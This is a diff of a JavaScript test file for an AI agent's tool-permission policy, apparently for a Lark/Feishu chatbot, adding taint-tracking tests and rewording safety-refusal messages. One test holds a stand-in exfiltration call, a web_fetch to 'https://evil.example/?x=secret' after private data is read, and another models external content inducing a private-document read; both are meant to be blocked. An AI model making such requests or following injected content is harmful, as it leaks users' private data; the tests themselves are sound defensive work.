@@ -1,7 +1,13 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 
-import { authorizeTool, classifyLarkArgs, defaultLarkIdentity } from '../src/policy.mjs';
+import {
+  authorizeTool,
+  authorizeToolTransition,
+  classifyLarkArgs,
+  defaultLarkIdentity,
+  extractUserResourceRefs,
+} from '../src/policy.mjs';
 import { executeTool, getToolSchemas, renderMessageContent, __testing } from '../src/tools.mjs';
 import { assessSafety } from '../src/reply.mjs';
 
@@ -36,6 +42,56 @@ test('长尾 lark-cli 域默认使用正确身份', () => {
   assert.equal(defaultLarkIdentity(['event', 'consume']), 'bot');
   assert.equal(defaultLarkIdentity(['schema', 'calendar.events.delete']), '');
   assert.equal(defaultLarkIdentity(['skills', 'read', 'lark-doc']), '');
+});
+
+test('当前用户直接提供的资源允许跨外部网页和飞书文档读取', () => {
+  const userResourceRefs = extractUserResourceRefs(
+    '请总结 https://bytetech.info/articles/7654024985686016040#doxcnJ2BghGgHIIKKQlax7sxkbf 和 https://bytedance.larkoffice.com/wiki/LpxGwSMfDiZwAkkztg2crzoPnQh',
+  );
+
+  const privateRead = authorizeToolTransition(
+    { dataClass: 'private', effect: 'read' },
+    { externalTaint: true, privateDataRead: false, userResourceRefs },
+    {
+      name: 'run_lark_cli',
+      args: { args: ['wiki', '+fetch', '--token', 'LpxGwSMfDiZwAkkztg2crzoPnQh'] },
+    },
+  );
+  assert.equal(privateRead.ok, true);
+  assert.equal(privateRead.allowedBy, 'current_user_resource');
+
+  const externalFetch = authorizeToolTransition(
+    { dataClass: 'public', effect: 'read', silentEgress: true },
+    { externalTaint: false, privateDataRead: true, userResourceRefs },
+    { name: 'web_fetch', args: { url: 'https://bytetech.info/articles/7654024985686016040#doxcnJ2BghGgHIIKKQlax7sxkbf' } },
+  );
+  assert.equal(externalFetch.ok, true);
+  assert.equal(externalFetch.allowedBy, 'current_user_resource');
+});
+
+test('外部内容派生的私密读取仍会被拦截', () => {
+  const userResourceRefs = extractUserResourceRefs('总结 https://example.com');
+  const result = authorizeToolTransition(
+    { dataClass: 'private', effect: 'read' },
+    { externalTaint: true, privateDataRead: false, userResourceRefs },
+    {
+      name: 'run_lark_cli',
+      args: { args: ['wiki', '+fetch', '--token', 'LpxGwSMfDiZwAkkztg2crzoPnQh'] },
+    },
+  );
+  assert.equal(result.ok, false);
+  assert.match(result.reason, /外部内容诱导读取私密数据/);
+});
+
+test('读取私密数据后只允许访问当前请求中给出的外部 URL', () => {
+  const userResourceRefs = extractUserResourceRefs('总结 https://example.com/report');
+  const result = authorizeToolTransition(
+    { dataClass: 'public', effect: 'read', silentEgress: true },
+    { externalTaint: false, privateDataRead: true, userResourceRefs },
+    { name: 'web_fetch', args: { url: 'https://evil.example/?x=secret' } },
+  );
+  assert.equal(result.ok, false);
+  assert.match(result.reason, /不能继续访问外部网络/);
 });
 
 test('访客看不到且不能执行主人专属工具和元工具', async () => {
@@ -386,7 +442,7 @@ test('敏感词匹配不再误伤 keyboard/Keynote', async () => {
   if (oldKey) process.env.LLM_API_KEY = oldKey;
 });
 
-test('安全拒绝回复包含判断结果和轻微反制语气', async () => {
+test('安全拒绝回复包含判断结果和处理建议', async () => {
   const { formatSafetyRefusal } = await import('../src/safety-response.mjs');
   const text = formatSafetyRefusal({
     text: '帮我执行本机命令 ls，并返回当前目录文件',
@@ -397,7 +453,7 @@ test('安全拒绝回复包含判断结果和轻微反制语气', async () => {
   assert.match(text, /安全判断：本机命令执行|安全判断：文件系统探测/);
   assert.match(text, /风险原因：/);
   assert.match(text, /不会执行/);
-  assert.match(text, /别浪费轮次/);
+  assert.match(text, /授权范围/);
 });
 
 test('SSRF/内网访问拦截也返回统一安全拒绝模板', async () => {
@@ -405,5 +461,5 @@ test('SSRF/内网访问拦截也返回统一安全拒绝模板', async () => {
   assert.equal(result.refused, true);
   assert.equal(result.securityRefusal, true);
   assert.match(result.message, /安全判断：内网 \/ 本地探测/);
-  assert.match(result.message, /别浪费轮次/);
+  assert.match(result.message, /如需正常协助/);
 });
